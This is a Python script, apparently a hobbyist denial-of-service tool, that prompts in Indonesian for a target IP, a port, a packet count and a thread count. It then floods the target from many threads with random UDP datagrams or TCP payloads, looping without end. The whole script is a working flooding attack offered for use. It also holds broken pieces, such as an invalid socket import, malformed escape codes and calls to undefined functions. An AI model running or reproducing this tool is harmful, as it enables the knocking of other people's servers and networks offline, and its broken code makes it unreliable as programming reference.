import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name
from socket import random,threading

print("\033[1;34;40m \n")
os.system("figlet DDOS ATTACK -f slant")
print("\033[1;33;40m Jika Anda memiliki masalah, posting utas di https://github.com/Fantastic/Python-UDP-Flood/issues\n")
print("\035[1;32;40m ==========================================")
print("\048[1;32;40m ░██████╗░░█████╗░░█████╗░██████╗░")
print("\057[1;32;40m ██╔════╝░██╔══██╗██╔══██╗██╔══██╗")
print("\063[1;32;40m ██║░░██╗░██║░░██║██║░░██║██║░░██║")
print("\091[1;32;40m ██║░░╚██╗██║░░██║██║░░██║██║░░██║")
print("\023[1;32;40m ╚██████╔╝╚█████╔╝╚█████╔╝██████╔╝")
print("\019[1;32;40m ░╚═════╝░░╚════╝░░╚════╝░╚═════╝░")
print("\078[1;32;40m========================================== ")
test = input()
if test == "n":
	exit(0)
ip = str(input(" Masukan IP Target:"))
port = int(input(" Masukan Port Target:"))
choice = str(input(" Attack:"))
times = int(input(" Masukan Jumlah Packet:"))
threads = int(input(" Masukan Jumlah Threads:"))
def DDOS():
	data = random._urandom(577)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Send Attack Started Packet To Target")
		except:
			s.close()
			print("[!] The Server Don't Been Responed Downed")

def ATTACK():
	data = random._urandom(37682)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Send Attack Started Packet To Target")
		except:
			s.close()
			print("[*] The Server Don't Been Responed Downed")

for y in range(threads):
	if choice == 'Attack':
		th = threading.Thread(target = DDOS)
		th.start()
	else:
		th = threading.Thread(target = ATTACK)
		th.start()

def new():
	for y in range(threads):
		if choice == 'Attack':
			th = threading.Thread(target = DDOS)
			th.start()
		else:
			th = threading.Thread(target = ATTACK)
			th.start()

def whereuwere():
    print("Aww man, I'm so sorry, but I can't remember if u were in TCP or UDP")
    print("Put 1 for UDP and 2 for TCP")
    whereman = str(input(" 1 or 2 >:("))
    if whereman == '1':
        run()
    else:
        run2()

def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Youre Leaving Sir -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
    # restore the original signal handler
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input(" You wanna exit bby <3 ?:"))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Ok ok")
        byebye()

    # restore the gracefully exit handler
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    # store SIGINT handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
